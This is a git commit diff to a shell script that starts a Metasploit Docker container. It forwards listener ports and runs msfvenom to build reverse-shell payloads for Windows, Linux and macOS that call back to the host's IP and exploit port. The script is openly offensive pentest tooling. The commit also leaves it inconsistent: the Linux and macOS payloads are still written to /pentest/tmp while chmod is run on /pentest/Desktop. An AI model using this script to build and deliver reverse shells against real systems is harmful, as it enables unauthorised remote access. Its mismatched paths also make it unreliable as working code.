b4a98df69d5e0fb5e37ca616018b1aa220d67091
Penn Oser <pennoser@gmail.com>
2018-07-16 20:18:02 -0500

    Updated start script

--- docker_start.sh
+++ docker_start.sh
@@ -3,7 +3,7 @@
 function print_help { echo "docker_start.sh -d <Folder for console desktop> -n <network iface> -p <exploit port> -w [Windows Payload] -l [Linux Payoad]" -o [OSX Payload] >&2 ; } 
 
 		
-while getopts d:n:p:uwlo option
+while getopts n:p:duwlo option
 do
 	case "${option}" in
 		d)
@@ -45,13 +45,10 @@ if [ -z $shellupgradeport ]; then
 	shellupgradeport=4433
 fi
 
-mkdir /tmp/msf
-
 # start bash ports forwarding and shared folders
 msf="$(docker run -d -t \
 	$forwardports -p $shellupgradeport:$shellupgradeport \
 	-v $desktopfolder:/pentest/Desktop \
-	-v /tmp/msf:/pentest/tmp \
 	pennoser/msf:latest /bin/bash)"
 
 # build basic reverse payloads for host
@@ -61,8 +58,7 @@ if [ -n "$winpay" ]; then
 		"LHOST=$hostip" \
 		"LPORT=$exploitport" \
 		-f "exe" \
-		-o "/pentest/tmp/shell.exe"
-	ln -s /tmp/msf/shell.exe $desktopfolder/shell.exe
+		-o "/pentest/Desktop/shell.exe"
 fi
 if [ -n "$linpay" ]; then
 	docker exec -ti $msf msfvenom \
@@ -72,8 +68,7 @@ if [ -n "$linpay" ]; then
 		-f "elf" \
 		-o "/pentest/tmp/shell"
 	docker exec -ti $msf /bin/bash \
-		-c "chmod +x /pentest/tmp/shell"
-	ln -s /tmp/msf/shell $desktopfolder/shell
+		-c "chmod +x /pentest/Desktop/shell"
 
 fi
 if [ -n "$osxpay" ]; then
@@ -83,8 +78,7 @@ if [ -n "$osxpay" ]; then
 		"LPORT=$exploitport" -f \
 		"macho" -o "/pentest/tmp/shell.command"
 	docker exec -ti $msf /bin/bash \
-		-c "chmod +x /pentest/tmp/shell.command"
-	ln -s /tmp/msf/shell.command $desktopfolder/shell.command
+		-c "chmod +x /pentest/Desktop/shell.command"
 fi
 
 # setup msfconsole startup
@@ -113,7 +107,6 @@ docker exec -ti $msf msf
 # cleanup
 docker container stop $msf
 docker container rm $msf
-rm -rf /tmp/msf
 desktopfolder=''
 netiface=''
 hostip=''
